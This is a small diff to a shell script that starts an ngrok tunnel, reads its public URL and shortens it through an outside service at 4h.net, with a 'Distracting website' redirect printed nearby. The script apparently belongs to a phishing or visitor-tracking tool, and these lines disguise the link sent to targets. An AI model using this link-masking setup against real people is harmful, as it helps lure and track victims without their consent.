@@ -120,8 +120,8 @@ printf "\e[1;93m[\e[0m+\e[1;94m] Starting ngrok server...\n"
 ./ngrok http 3333 > /dev/null 2>&1 &
 sleep 10
 
-link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
-send_ip=$(curl -s https://4h.net/api.php?url=$link)
+link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[-0-9a-z]*\.ngrok.io")
+send_ip=$(curl -s https://4h.net/api/?url=$link)
 printf "\n"
 printf '\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Distracting website:\e[0m\e[1;77m %s\n' $redirect_link
 printf "\n"
